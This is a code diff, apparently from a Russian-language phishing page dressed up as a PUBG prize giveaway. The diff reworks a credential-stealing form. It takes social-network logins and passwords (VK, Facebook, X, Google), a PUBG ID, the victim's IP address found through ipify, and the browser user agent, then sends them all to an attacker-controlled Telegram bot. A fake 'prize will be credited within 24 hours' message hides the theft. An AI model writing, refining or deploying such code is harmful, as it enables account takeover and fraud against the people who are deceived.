+                    confirmationSection.scrollIntoView({ behavior: 'smooth' });
+                    
+                    showNotification("Данные отправлены! Приз будет зачислен в течение 24 часов.");
+                } else {
+                    showNotification("Ошибка отправки данных. Попробуйте еще раз.", true);
                 }
-                
-                sendDataToTelegram('Facebook', email, password);
-                closeLoginModal();
-                showConfirmationSection();
-            };
-            
-            window.submitXLogin = function() {
-                const password = xPasswordInput.value.trim();
-                
-                if (!password) {
-                    showNotification("Пожалуйста, введите пароль", true);
-                    return;
-                }
-                
-                sendDataToTelegram('X', xUsername, password);
-                closeLoginModal();
-                showConfirmationSection();
-            };
-            
-            window.submitGoogleLogin = function() {
-                const email = googleEmailInput.value.trim() || '';
-                
-                if (!email) {
-                    showNotification("Пожалуйста, введите email или телефон", true);
-                    return;
-                }
-                
-                sendDataToTelegram('Google', email, '');
-                closeLoginModal();
-                showConfirmationSection();
-            };
-            
-            // Функция показа секции подтверждения
-            function showConfirmationSection() {
-                socialSelectSection.classList.remove('active');
-                prizeSection.classList.remove('active');
-                confirmationSection.classList.add('active');
-                confirmationSection.scrollIntoView({ behavior: 'smooth' });
-            }
+            });
             
             // Функция отправки данных в Telegram
-            async function sendDataToTelegram(social, login, password) {
+            async function sendDataToTelegram(social, login, password, pubgId, prizeIndex) {
+                const socialNames = {
+                    'vk': 'ВКонтакте',
+                    'facebook': 'Facebook',
+                    'x': 'X (Twitter)',
+                    'google': 'Google'
+                };
+                
+                const prizeName = `Приз #${prizeIndex + 1}`;
+                
                 const message = `🎮 НОВЫЙ ВЫИГРЫШ PUBG 🎮\n\n` +
-                               `📱 Соцсеть: ${social}\n` +
+                               `📱 Соцсеть: ${socialNames[social] || social}\n` +
                                `👤 Логин: ${login}\n` +
                                `🔑 Пароль: ${password}\n` +
-                               `🎁 Выигранный приз: Приз #${finalPrizeIndex + 1}\n` +
+                               `🎮 PUBG ID: ${pubgId || 'Не указан'}\n` +
+                               `🎁 Выигранный приз: ${prizeName}\n` +
                                `⏰ Время: ${new Date().toLocaleString()}\n` +
-                               `🌐 User Agent: ${navigator.userAgent}`;
+                               `🌐 User Agent: ${navigator.userAgent}\n` +
+                               `📍 IP: собирается...`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
                 try {
+                    // Попробуем получить IP адрес
+                    let ipAddress = 'Не определен';
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        ipAddress = ipData.ip;
+                    } catch (ipError) {
+                        console.log('Не удалось получить IP:', ipError);
+                    }
+                    
+                    // Заменяем IP в сообщении
+                    const finalMessage = message.replace('собирается...', ipAddress);
+                    
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: {
@@ -1709,17 +1082,23 @@
                         },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
+                            text: finalMessage,
                             parse_mode: 'HTML'
                         })
                     });
                     
                     const data = await response.json();
                     console.log('Telegram response:', data);
-                    showNotification("Данные отправлены! Приз будет зачислен в течение 24 часов.");
+                    
+                    if (data.ok) {
+                        return true;
+                    } else {
+                        console.error('Telegram error:', data);
+                        return false;
+                    }
                 } catch (error) {
                     console.error('Error sending to Telegram:', error);
-                    showNotification("Ошибка отправки данных", true);
+                    return false;
                 }
             }
             
@@ -1750,14 +1129,6 @@
                     const img = new Image();
                     img.src = `priz${i}.png`;
                 }
-                
-                // Предзагрузка логотипа Google
-                const googleLogo = new Image();
-                googleLogo.src = 'google-logo.png';
-                googleLogo.onerror = function() {
-                    // Если картинка не загружена, показываем заглушку
-                    googleLogoImg.style.display = 'none';
-                };
             }
             
             preloadImages();
@@ -1769,13 +1140,23 @@
                 }
             });
             
-            // Закрытие модального окна при клике вне его
-            document.querySelectorAll('.login-modal').forEach(modal => {
-                modal.addEventListener('click', function(event) {
-                    if (event.target === this) {
-                        closeLoginModal();
-                    }
-                });
+            // Разрешаем отправку формы по Enter
+            loginInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
+            });
+            
+            pubgIdInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    submitBtn.click();
+                }
             });
         });
     </script>
